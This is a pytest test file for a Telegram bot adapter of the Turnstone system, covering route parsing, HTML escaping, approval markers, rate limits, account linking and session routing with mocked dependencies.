"""Tests for the Telegram channel adapter (bot, config, routes)."""

from __future__ import annotations

import asyncio
import itertools
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

telegram = pytest.importorskip("telegram")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _run(coro):  # type: ignore[no-untyped-def]
    """Run an async coroutine in a fresh event loop (no pytest-asyncio needed)."""
    return asyncio.run(coro)


def _make_user(uid: int = 12345, is_bot: bool = False, full_name: str = "Test User"):
    return SimpleNamespace(id=uid, is_bot=is_bot, full_name=full_name)


def _make_chat(cid: int = -100200, type: str = "supergroup", is_forum: bool = False):  # noqa: A002
    return SimpleNamespace(id=cid, type=type, is_forum=is_forum)


def _make_message(
    mid: int = 200,
    text: str = "hello",
    *,
    reply_to=None,
    thread_id: int | None = None,
):
    msg = SimpleNamespace(
        message_id=mid,
        text=text,
        reply_to_message=reply_to,
        message_thread_id=thread_id,
    )
    msg.reply_text = AsyncMock(return_value=SimpleNamespace(message_id=mid + 5000))
    return msg


def _make_update(message=None, user=None, chat=None):
    return SimpleNamespace(effective_message=message, effective_user=user, effective_chat=chat)


def _make_callback_query(
    data: str,
    uid: int,
    message_text: str,
    *,
    mid: int = 42,
    chat_id: int = -100200,
):
    return SimpleNamespace(
        data=data,
        from_user=SimpleNamespace(id=uid),
        message=SimpleNamespace(text=message_text, message_id=mid, chat_id=chat_id),
        answer=AsyncMock(),
    )


def _make_bot(**config_kwargs) -> tuple[object, MagicMock, MagicMock]:
    """Build a TurnstoneTelegramBot with fully mocked dependencies."""
    from turnstone.channels.telegram.bot import TurnstoneTelegramBot
    from turnstone.channels.telegram.config import TelegramConfig

    config = TelegramConfig(bot_token="test-token", **config_kwargs)

    storage = MagicMock()
    storage.list_channel_routes_by_type = MagicMock(return_value=[])

    from turnstone.channels._routing import PolicyVerdict

    router = MagicMock()
    router.get_or_create_workstream = AsyncMock(return_value=("ws-1", True))
    router.get_channel_default_alias = AsyncMock(return_value="")
    router.get_live_workstream_ids = AsyncMock(side_effect=lambda ws_ids: set(ws_ids))
    router.send_message = AsyncMock()
    router.send_approval = AsyncMock()
    router.get_node_url = AsyncMock(return_value="http://localhost:8080")
    router.evaluate_tool_policies = AsyncMock(return_value=PolicyVerdict(kind="none"))
    router.delete_route = AsyncMock(return_value=True)
    router.close_workstream = AsyncMock()
    # Default: every test Telegram user is already linked. Tests that
    # exercise the unlinked path override this per-instance.
    router.resolve_user = AsyncMock(return_value="turnstone-user-1")
    router.aclose = AsyncMock()

    # Patch Application so each test doesn't build a real PTB Application.
    # The bot's _http_client is only used by the SSE listener (which we
    # replace with an AsyncMock below), so an AsyncMock standin is enough.
    with (
        patch("turnstone.channels.telegram.bot.Application", MagicMock()),
        patch(
            "turnstone.channels.telegram.bot.httpx2.AsyncClient",
            return_value=AsyncMock(),
        ),
    ):
        bot = TurnstoneTelegramBot(
            config,
            server_url="http://localhost:8080",
            storage=storage,
        )

    bot._sse_listener = AsyncMock()  # Subscription behavior is tested separately.
    bot.router = router  # type: ignore[attr-defined]

    ptb = bot._app.bot  # type: ignore[attr-defined]
    counter = itertools.count(1000)

    def _next_message(*_a, **_k):  # type: ignore[no-untyped-def]
        return SimpleNamespace(message_id=next(counter))

    ptb.send_message = AsyncMock(side_effect=_next_message)
    ptb.edit_message_text = AsyncMock(return_value=SimpleNamespace(message_id=1))
    ptb.create_forum_topic = AsyncMock(return_value=SimpleNamespace(message_thread_id=555))
    ptb.get_chat = AsyncMock(return_value=SimpleNamespace(is_forum=False))

    return bot, router, ptb


def _approval_body(ws: str = "ws-1", cyc: str = "cyc-1", owner: str = "777") -> str:
    """The text of a posted approval prompt the callback query reads back."""
    return f"<b>Tool Approval Required</b>\nts:{ws}|{cyc}|{owner}"


# ---------------------------------------------------------------------------
# TelegramConfig
# ---------------------------------------------------------------------------


class TestTelegramConfig:
    """Tests for TelegramConfig default and custom values."""

    def test_defaults(self) -> None:
        from turnstone.channels.telegram.config import TelegramConfig

        cfg = TelegramConfig()
        assert cfg.bot_token == ""
        assert cfg.allowed_chats == []
        assert cfg.max_message_length == 4096
        assert cfg.streaming_edit_interval == 1.5
        # Inherited from ChannelConfig
        assert cfg.model == ""
        assert cfg.auto_approve is False

    def test_custom_values(self) -> None:
        from turnstone.channels.telegram.config import TelegramConfig

        cfg = TelegramConfig(
            bot_token="tok-123",
            allowed_chats=[-100, -200],
            max_message_length=4000,
            streaming_edit_interval=0.5,
            model="gpt-4.1",
            auto_approve=True,
        )
        assert cfg.bot_token == "tok-123"
        assert cfg.allowed_chats == [-100, -200]
        assert cfg.max_message_length == 4000
        assert cfg.streaming_edit_interval == 0.5
        assert cfg.model == "gpt-4.1"
        assert cfg.auto_approve is True


# ---------------------------------------------------------------------------
# TelegramRoute
# ---------------------------------------------------------------------------


class TestTelegramRoute:
    """Tests for canonical Telegram route parsing/formatting."""

    def test_parse_chat_only(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        route = TelegramRoute.parse("-100200")
        assert route.chat == "-100200"
        assert route.user_id is None
        assert route.thread_id is None

    def test_parse_chat_and_user(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        route = TelegramRoute.parse("-100200:12345")
        assert route.chat == "-100200"
        assert route.user_id == "12345"
        assert route.thread_id is None

    def test_parse_full(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        route = TelegramRoute.parse("-100200:12345:555")
        assert route.chat == "-100200"
        assert route.user_id == "12345"
        assert route.thread_id == "555"

    def test_to_channel_id(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        assert TelegramRoute(chat="-100200").to_channel_id() == "-100200"
        assert TelegramRoute(chat="-100200", user_id="12345").to_channel_id() == "-100200:12345"
        assert (
            TelegramRoute(chat="-100200", user_id="12345", thread_id="555").to_channel_id()
            == "-100200:12345:555"
        )

    def test_round_trip(self) -> None:
        """Every shape emitted by to_channel_id must round-trip through parse."""
        from turnstone.channels.telegram.routes import TelegramRoute

        shapes = [
            TelegramRoute(chat="-100200"),
            TelegramRoute(chat="-100200", user_id="12345"),
            TelegramRoute(chat="-100200", user_id="12345", thread_id="555"),
        ]
        for route in shapes:
            assert TelegramRoute.parse(route.to_channel_id()) == route

    def test_parse_trailing_colon_normalizes(self) -> None:
        """``"-100200:"`` should normalize to ``TelegramRoute("-100200")``."""
        from turnstone.channels.telegram.routes import TelegramRoute

        assert TelegramRoute.parse("-100200:") == TelegramRoute(chat="-100200")
        assert TelegramRoute.parse("-100200:12345:") == TelegramRoute(
            chat="-100200", user_id="12345"
        )

    def test_parse_extra_colons_folded_into_thread_id(self) -> None:
        """Extra ``:`` past the third field fold into ``thread_id`` verbatim.

        Telegram chat, user, and message IDs never contain ``:`` so this
        is safe in practice; the test locks the documented behaviour.
        """
        from turnstone.channels.telegram.routes import TelegramRoute

        route = TelegramRoute.parse("-100200:12345:555:extra")
        assert route.chat == "-100200"
        assert route.user_id == "12345"
        assert route.thread_id == "555:extra"


# ---------------------------------------------------------------------------
# HTML escaping / rendering
# ---------------------------------------------------------------------------


class TestHtmlEscaping:
    """User/model-authored fields must reach the Telegram wire entity-escaped
    while the bot's own HTML framing stays live."""

    def test_escape_html_escapes_entities(self) -> None:
        from turnstone.channels.telegram.bot import _escape_html

        assert _escape_html("a & b <tag> c") == "a &amp; b &lt;tag&gt; c"

    def test_render_converts_light_markdown(self) -> None:
        from turnstone.channels.telegram.bot import _render_escaped_html

        out = _render_escaped_html("**bold** and *italic* and `code`")
        assert "<b>bold</b>" in out
        assert "<i>italic</i>" in out
        assert "<code>code</code>" in out

    def test_render_fenced_code_becomes_pre(self) -> None:
        from turnstone.channels.telegram.bot import _render_escaped_html

        out = _render_escaped_html("before```ls -l```after")
        assert "<pre>ls -l</pre>" in out

    def test_render_leaves_unpaired_markers_literal(self) -> None:
        """Malformed model output can never unbalance the markup."""
        from turnstone.channels.telegram.bot import _render_escaped_html

        assert _render_escaped_html("a * b ** c") == "a * b ** c"

    def test_render_does_not_rewrite_inside_code(self) -> None:
        from turnstone.channels.telegram.bot import _render_escaped_html

        out = _render_escaped_html("`*not italic*`")
        assert "<code>*not italic*</code>" in out

    def test_safe_html_cut_strips_partial_entity(self) -> None:
        from turnstone.channels.telegram.bot import _safe_html_cut

        # The cut lands inside "&amp;" before its closing semicolon.
        cut = _safe_html_cut("ok &amp; mo", 7)
        assert cut == "ok "
        assert "&am" not in cut

    def test_safe_html_cut_keeps_complete_entity(self) -> None:
        from turnstone.channels.telegram.bot import _safe_html_cut

        text = "a &amp; b"
        assert _safe_html_cut(text, len(text)) == text

    @pytest.mark.parametrize(
        ("raw", "shown"),
        [
            ("x` *ok*\n*Approved by policy*", "x' *ok* *Approved by policy*"),
            ("\n \n", "tool"),
            ("t" * 150, "t" * 99 + chr(0x2026)),
        ],
    )
    def test_code_name_flattens_and_caps(self, raw: str, shown: str) -> None:
        from turnstone.channels.telegram.bot import _code_name

        assert _code_name(raw) == shown


# ---------------------------------------------------------------------------
# Approval marker
# ---------------------------------------------------------------------------


class TestApprovalMarker:
    def test_parse_full_marker(self) -> None:
        from turnstone.channels.telegram.bot import _parse_approval_marker

        assert _parse_approval_marker(_approval_body()) == ("ws-1", "cyc-1", "777")

    def test_parse_marker_with_empty_owner(self) -> None:
        from turnstone.channels.telegram.bot import _parse_approval_marker

        assert _parse_approval_marker("prefix\nts:ws-1|cyc-1|") == ("ws-1", "cyc-1", "")

    def test_parse_marker_absent(self) -> None:
        from turnstone.channels.telegram.bot import _parse_approval_marker

        assert _parse_approval_marker("no marker here") is None
        assert _parse_approval_marker(None) is None

    def test_posted_prompt_contains_marker(self) -> None:
        """The posted approval card embeds the correlation marker in its
        text so callback queries can parse it back out after a restart."""
        from turnstone.channels.telegram.bot import _parse_approval_marker
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk.events import ApproveRequestEvent

        bot, _router, ptb = _make_bot()
        event = ApproveRequestEvent(
            ws_id="ws-1",
            cycle_id="cyc-1",
            items=[{"call_id": "c-1", "func_name": "bash", "needs_approval": True}],
        )
        route = TelegramRoute(chat="-100200", user_id="U12345", thread_id="555")
        _run(bot._on_ws_event("ws-1", route, event))  # type: ignore[attr-defined]

        body = ptb.send_message.call_args.kwargs["text"]
        # Telegram parses the HTML at send time and stores plain text on
        # the message — the <i> wrapper around the marker never reaches
        # callback queries, so simulate that presentation here.
        plain = body.replace("<i>", "").replace("</i>", "")
        assert _parse_approval_marker(plain) == ("ws-1", "cyc-1", "U12345")


# ---------------------------------------------------------------------------
# Rate limits
# ---------------------------------------------------------------------------


class TestRateLimits:
    def test_per_user_send_cap(self) -> None:
        from turnstone.channels.telegram.bot import _PER_USER_RATE_LIMIT

        bot, _router, _ptb = _make_bot()
        for _ in range(_PER_USER_RATE_LIMIT):
            assert bot._allow_user_send("12345")  # type: ignore[attr-defined]
        assert not bot._allow_user_send("12345")  # type: ignore[attr-defined]

    def test_per_user_send_cap_is_per_user(self) -> None:
        from turnstone.channels.telegram.bot import _PER_USER_RATE_LIMIT

        bot, _router, _ptb = _make_bot()
        for _ in range(_PER_USER_RATE_LIMIT):
            assert bot._allow_user_send("12345")  # type: ignore[attr-defined]
        # A different user is unaffected.
        assert bot._allow_user_send("99999")  # type: ignore[attr-defined]

    def test_link_rate_limit_blocks_after_cap(self) -> None:
        """Sec-3: /link must throttle at _LINK_RATE_LIMIT/hour."""
        from turnstone.channels.telegram.bot import _LINK_RATE_LIMIT

        bot, _router, _ptb = _make_bot()
        for _ in range(_LINK_RATE_LIMIT):
            assert bot._allow_link_attempt("12345")  # type: ignore[attr-defined]
        assert not bot._allow_link_attempt("12345")  # type: ignore[attr-defined]


# ---------------------------------------------------------------------------
# /link and /unlink
# ---------------------------------------------------------------------------


class TestLinkFlow:
    def _link_update(self, *, chat_type: str = "private", args: list[str] | None = None):
        message = _make_message(mid=1, text="/link")
        user = _make_user(uid=12345)
        chat = _make_chat(cid=12345, type=chat_type)
        update = _make_update(message=message, user=user, chat=chat)
        context = SimpleNamespace(args=args if args is not None else ["tok-123"])
        return update, context, message

    def test_link_rejected_in_group(self) -> None:
        bot, _router, _ptb = _make_bot()
        update, context, message = self._link_update(chat_type="supergroup")

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with("Please run /link in a private chat with me.")
        bot.storage.get_api_token_by_hash.assert_not_called()  # type: ignore[attr-defined]

    def test_link_rate_limited(self) -> None:
        from turnstone.channels.telegram.bot import _LINK_RATE_LIMIT

        bot, _router, _ptb = _make_bot()
        for _ in range(_LINK_RATE_LIMIT):
            bot._allow_link_attempt("12345")  # type: ignore[attr-defined]
        update, context, message = self._link_update()

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        assert "Too many /link attempts" in message.reply_text.await_args.args[0]

    def test_link_usage_hint_without_token(self) -> None:
        bot, _router, _ptb = _make_bot()
        update, context, message = self._link_update(args=[])

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with("Usage: /link <your_api_token>")

    def test_link_invalid_token(self) -> None:
        bot, _router, _ptb = _make_bot()
        bot.storage.get_channel_user = MagicMock(return_value=None)  # type: ignore[attr-defined]
        bot.storage.get_api_token_by_hash = MagicMock(return_value=None)  # type: ignore[attr-defined]
        update, context, message = self._link_update()

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with(
            "Invalid token.  Please provide a valid Turnstone API token."
        )
        bot.storage.create_channel_user.assert_not_called()  # type: ignore[attr-defined]

    def test_link_when_already_linked(self) -> None:
        bot, _router, _ptb = _make_bot()
        bot.storage.get_channel_user = MagicMock(  # type: ignore[attr-defined]
            return_value={"user_id": "turnstone-user-1"}
        )
        update, context, message = self._link_update()

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with(
            "Your Telegram account is already linked.  Use /unlink first."
        )

    def test_link_success(self) -> None:
        bot, _router, _ptb = _make_bot()
        bot.storage.get_channel_user = MagicMock(return_value=None)  # type: ignore[attr-defined]
        bot.storage.get_api_token_by_hash = MagicMock(  # type: ignore[attr-defined]
            return_value={"user_id": "turnstone-user-1"}
        )
        update, context, message = self._link_update()

        _run(bot._on_link_command(update, context))  # type: ignore[attr-defined]

        bot.storage.create_channel_user.assert_called_once_with(  # type: ignore[attr-defined]
            "telegram", "12345", "turnstone-user-1"
        )
        message.reply_text.assert_awaited_once_with(
            "Linked.  You can now use Turnstone from Telegram."
        )


class TestUnlinkFlow:
    def _unlink_update(self):
        message = _make_message(mid=1, text="/unlink")
        user = _make_user(uid=12345)
        chat = _make_chat(cid=12345, type="private")
        update = _make_update(message=message, user=user, chat=chat)
        context = SimpleNamespace(args=[])
        return update, context, message

    def test_unlink_when_not_linked(self) -> None:
        bot, _router, _ptb = _make_bot()
        bot.storage.get_channel_user = MagicMock(return_value=None)  # type: ignore[attr-defined]
        update, context, message = self._unlink_update()

        _run(bot._on_unlink_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with("Your Telegram account was not linked.")
        bot.storage.delete_channel_user.assert_not_called()  # type: ignore[attr-defined]

    def test_unlink_success(self) -> None:
        bot, _router, _ptb = _make_bot()
        bot.storage.get_channel_user = MagicMock(  # type: ignore[attr-defined]
            return_value={"user_id": "turnstone-user-1"}
        )
        update, context, message = self._unlink_update()

        _run(bot._on_unlink_command(update, context))  # type: ignore[attr-defined]

        bot.storage.delete_channel_user.assert_called_once_with("telegram", "12345")  # type: ignore[attr-defined]
        message.reply_text.assert_awaited_once_with("Unlinked.")


# ---------------------------------------------------------------------------
# _on_message filtering and routing
# ---------------------------------------------------------------------------


class TestOnMessage:
    """Tests for the _on_message handler filtering logic."""

    def test_ignores_bot_messages(self) -> None:
        bot, router, _ptb = _make_bot()
        update = _make_update(
            message=_make_message(),
            user=_make_user(is_bot=True),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()

    def test_ignores_empty_text(self) -> None:
        bot, router, _ptb = _make_bot()
        update = _make_update(
            message=_make_message(text="   "),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()

    def test_ignores_non_allowed_chat(self) -> None:
        bot, router, _ptb = _make_bot(allowed_chats=[-100999])
        bot._channel_sessions[("-100200", "12345")] = ("ws-1", "555")  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(thread_id=555),
            user=_make_user(),
            chat=_make_chat(is_forum=True),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()

    def test_forum_message_outside_topic_ignored(self) -> None:
        bot, router, _ptb = _make_bot()
        bot._channel_sessions[("-100200", "12345")] = ("ws-1", "555")  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(thread_id=999),
            user=_make_user(),
            chat=_make_chat(is_forum=True),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()

    def test_forum_message_in_session_topic_routes(self) -> None:
        bot, router, _ptb = _make_bot()
        bot._channel_sessions[("-100200", "12345")] = ("ws-1", "555")  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(thread_id=555),
            user=_make_user(),
            chat=_make_chat(is_forum=True),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_awaited_once_with("ws-1", "hello")

    def test_non_forum_message_outside_reply_chain_ignored(self) -> None:
        bot, router, _ptb = _make_bot()
        bot._channel_sessions[("-100200", "12345")] = ("ws-1", "100")  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(mid=999, reply_to=None),
            user=_make_user(),
            chat=_make_chat(is_forum=False),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()

    def test_non_forum_reply_chain_member_routes(self) -> None:
        bot, router, _ptb = _make_bot()
        bot._channel_sessions[("-100200", "12345")] = ("ws-1", "100")  # type: ignore[attr-defined]
        bot._track_session_msg(("-100200", "12345"), 100)  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(mid=999, reply_to=SimpleNamespace(message_id=100)),
            user=_make_user(),
            chat=_make_chat(is_forum=False),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_awaited_once_with("ws-1", "hello")

    def test_unlinked_user_gets_link_hint(self) -> None:
        bot, router, ptb = _make_bot()
        bot.router.resolve_user = AsyncMock(return_value=None)  # type: ignore[attr-defined]
        update = _make_update(
            message=_make_message(mid=300, text="hi there", thread_id=555),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert "link" in ptb.send_message.await_args.kwargs["text"]
        router.send_message.assert_not_awaited()

    def test_oversize_message_rejected(self) -> None:
        bot, router, ptb = _make_bot()
        update = _make_update(
            message=_make_message(mid=300, text="x" * 9000),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert "too long" in ptb.send_message.await_args.kwargs["text"]
        router.send_message.assert_not_awaited()

    def test_dm_routes_freely(self) -> None:
        bot, router, _ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(return_value=("ws-dm", True))
        update = _make_update(
            message=_make_message(),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_awaited_once()

    def test_dm_passes_the_channel_model_lookup_uncalled(self) -> None:
        # The router looks the model up only when the DM starts or forks a
        # conversation, so a DM to a live one never waits on it or fails
        # with it.
        bot, router, _ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(return_value=("ws-dm", True))
        update = _make_update(
            message=_make_message(),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        model = router.get_or_create_workstream.await_args.kwargs["model"]
        assert model is router.get_channel_default_alias
        router.get_channel_default_alias.assert_not_awaited()

    def test_dm_says_the_model_is_not_available(self) -> None:
        from turnstone.channels._routing import MODEL_UNAVAILABLE_REPLY
        from turnstone.sdk._types import TurnstoneAPIError

        bot, router, ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(
            side_effect=TurnstoneAPIError(503, "node text", code="model_not_loaded")
        )
        update = _make_update(
            message=_make_message(mid=300),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert MODEL_UNAVAILABLE_REPLY in ptb.send_message.await_args.kwargs["text"]
        router.send_message.assert_not_awaited()

    def test_dm_other_failures_keep_the_generic_reply(self) -> None:
        from turnstone.sdk._types import TurnstoneAPIError

        bot, router, ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(side_effect=TurnstoneAPIError(503, "x"))
        update = _make_update(
            message=_make_message(mid=300),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert (
            ptb.send_message.await_args.kwargs["text"]
            == "Sorry, something went wrong routing your message."
        )

    def test_notification_reply_routes_to_origin_workstream(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, router, _ptb = _make_bot()
        ws_id = "ws-123"
        bot._notify_ws_map[(-100200, 500)] = (  # type: ignore[attr-defined]
            ws_id,
            TelegramRoute(chat="-100200", user_id="12345", thread_id="500"),
        )
        update = _make_update(
            message=_make_message(
                mid=999, text="reply text", reply_to=SimpleNamespace(message_id=500)
            ),
            user=_make_user(),
            chat=_make_chat(),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_awaited_once_with(ws_id, "reply text")
        assert bot._notify_reply_routes[ws_id] == TelegramRoute(  # type: ignore[attr-defined]
            chat="-100200",
            user_id="12345",
            thread_id="500",
        )

    def test_notification_reply_in_forum_follows_topic(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, router, _ptb = _make_bot()
        bot._forum_cache[-100200] = True  # type: ignore[attr-defined]
        bot._notify_ws_map[(-100200, 500)] = (  # type: ignore[attr-defined]
            "ws-123",
            TelegramRoute(chat="-100200", user_id="12345", thread_id="500"),
        )
        update = _make_update(
            message=_make_message(
                mid=999,
                thread_id=700,
                reply_to=SimpleNamespace(message_id=500),
            ),
            user=_make_user(),
            chat=_make_chat(is_forum=True),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert bot._notify_reply_routes["ws-123"].thread_id == "700"  # type: ignore[attr-defined]
        router.send_message.assert_awaited_once_with("ws-123", "hello")

    def test_notification_reply_dead_ws_clears_tracking(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute
        from turnstone.sdk._types import TurnstoneAPIError

        bot, router, ptb = _make_bot()
        ws_id = "ws-dead"
        bot._notify_ws_map[(-100200, 500)] = (  # type: ignore[attr-defined]
            ws_id,
            TelegramRoute(chat="-100200", user_id="12345", thread_id="500"),
        )
        router.send_message.side_effect = TurnstoneAPIError(404, "Unknown workstream")
        update = _make_update(
            message=_make_message(
                mid=999, text="reply text", reply_to=SimpleNamespace(message_id=500)
            ),
            user=_make_user(),
            chat=_make_chat(type="private"),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        assert ws_id not in bot._notify_reply_routes  # type: ignore[attr-defined]
        assert (-100200, 500) not in bot._notify_ws_map  # type: ignore[attr-defined]
        assert "no longer linked" in ptb.send_message.await_args.kwargs["text"]

    def test_notification_reply_other_author_ignored(self) -> None:
        from turnstone.channels.telegram.routes import TelegramRoute

        bot, router, _ptb = _make_bot()
        bot._notify_ws_map[(-100200, 500)] = (  # type: ignore[attr-defined]
            "ws-123",
            TelegramRoute(chat="-100200", user_id="12345", thread_id="500"),
        )
        update = _make_update(
            message=_make_message(
                mid=999, text="reply text", reply_to=SimpleNamespace(message_id=500)
            ),
            user=_make_user(uid=99999),
            chat=_make_chat(),
        )

        _run(bot._on_message(update, AsyncMock()))  # type: ignore[attr-defined]

        router.send_message.assert_not_awaited()


# ---------------------------------------------------------------------------
# /turnstone session lifecycle
# ---------------------------------------------------------------------------


class TestTurnstoneCommand:
    def _command_update(
        self,
        *,
        chat_type: str = "supergroup",
        is_forum: bool = False,
        cid: int = -100200,
        uid: int = 12345,
        args: list[str] | None = None,
    ):
        message = _make_message(mid=200, text="/turnstone")
        user = _make_user(uid=uid)
        chat = _make_chat(cid=cid, type=chat_type, is_forum=is_forum)
        update = _make_update(message=message, user=user, chat=chat)
        context = SimpleNamespace(args=args if args is not None else [])
        return update, context, message

    def test_forum_session_creates_topic_and_workstream(self) -> None:
        bot, router, ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(return_value=("ws-new", True))
        update, context, _message = self._command_update(is_forum=True)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        ptb.create_forum_topic.assert_awaited_once()
        # The topic anchors the session route.
        route = router.get_or_create_workstream.await_args.kwargs["channel_id"]
        assert route == "-100200:12345:555"
        assert bot._channel_sessions[("-100200", "12345")] == ("ws-new", "555")  # type: ignore[attr-defined]
        # The greeting lands inside the new topic.
        assert ptb.send_message.await_args.kwargs["message_thread_id"] == 555

    def test_forum_session_forwards_command_args(self) -> None:
        bot, router, _ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(return_value=("ws-new", True))
        update, context, _message = self._command_update(is_forum=True, args=["deploy", "the app"])

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        router.send_message.assert_awaited_once_with("ws-new", "deploy the app")

    def test_non_forum_session_posts_opener_and_tracks_chain(self) -> None:
        bot, router, ptb = _make_bot()
        router.get_or_create_workstream = AsyncMock(return_value=("ws-new", True))
        update, context, _message = self._command_update(is_forum=False)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        # Opener posted, greeting replies to it, and both anchor the chain.
        assert ptb.send_message.await_count >= 2
        opener_call, greeting_call = ptb.send_message.await_args_list[:2]
        opener_text = (
            opener_call.args[1] if len(opener_call.args) > 1 else opener_call.kwargs.get("text", "")
        )
        assert "started a turnstone session." in opener_text
        # The greeting is threaded onto the opener (mock counter: first
        # message id is 1000) as the chain anchor.
        assert greeting_call.kwargs["reply_to_message_id"] == 1000
        assert bot._session_msgs[("-100200", "12345")]  # type: ignore[attr-defined]

    def test_non_allowed_chat_rejected(self) -> None:
        bot, router, ptb = _make_bot(allowed_chats=[-100999])
        update, context, message = self._command_update()

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited_once_with("Sorry, turnstone isn't enabled in this chat.")
        router.get_or_create_workstream.assert_not_awaited()

    def test_unlinked_user_gets_link_hint(self) -> None:
        bot, router, ptb = _make_bot()
        bot.router.resolve_user = AsyncMock(return_value=None)  # type: ignore[attr-defined]
        update, context, _message = self._command_update()

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        assert "link" in ptb.send_message.await_args.kwargs["text"]
        router.get_or_create_workstream.assert_not_awaited()

    def test_same_user_second_session_archives_first(self) -> None:
        bot, router, ptb = _make_bot()
        bot._channel_sessions[("-100200", "12345")] = ("ws-old", "100")  # type: ignore[attr-defined]
        bot._subscribed_ws.add("ws-old")  # type: ignore[attr-defined]
        router.get_or_create_workstream = AsyncMock(return_value=("ws-new", True))
        update, context, _message = self._command_update(is_forum=False)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        router.close_workstream.assert_awaited_once_with("ws-old")
        router.delete_route.assert_awaited_once_with(
            "telegram", "-100200:12345:100", expected_ws_id="ws-old"
        )
        ws_id, _thread = bot._channel_sessions[("-100200", "12345")]  # type: ignore[attr-defined]
        assert ws_id == "ws-new"
        texts = [str(c) for c in ptb.send_message.call_args_list]
        assert any("archived" in t for t in texts)

    def test_other_users_session_not_archived(self) -> None:
        bot, router, _ptb = _make_bot()
        bot._channel_sessions[("-100200", "111")] = ("ws-user1", "100")  # type: ignore[attr-defined]
        router.get_or_create_workstream = AsyncMock(return_value=("ws-user2", True))
        update, context, _message = self._command_update(uid=222)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        router.close_workstream.assert_not_awaited()
        assert bot._channel_sessions[("-100200", "111")] == ("ws-user1", "100")  # type: ignore[attr-defined]

    def test_anchor_failure_keeps_old_session(self) -> None:
        bot, router, ptb = _make_bot()
        ptb.create_forum_topic = AsyncMock(side_effect=Exception("not allowed"))
        bot._channel_sessions[("-100200", "12345")] = ("ws-old", "100")  # type: ignore[attr-defined]
        update, context, message = self._command_update(is_forum=True)

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        message.reply_text.assert_awaited()
        assert bot._channel_sessions[("-100200", "12345")] == ("ws-old", "100")  # type: ignore[attr-defined]
        router.close_workstream.assert_not_awaited()

    def test_model_lookup_failure_keeps_the_session(self) -> None:
        from turnstone.channels._routing import MODEL_LOOKUP_FAILED_REPLY
        from turnstone.sdk._types import TurnstoneAPIError

        bot, router, ptb = _make_bot()
        router.get_channel_default_alias = AsyncMock(side_effect=TurnstoneAPIError(503, "down"))
        bot._channel_sessions[("-100200", "12345")] = ("ws-old", "100")  # type: ignore[attr-defined]
        update, context, message = self._command_update()

        _run(bot._on_turnstone_command(update, context))  # type: ignore[attr-defined]

        router.close_workstream.assert_not_awaited()
        router.get_or_create_workstream.assert_not_awaited()
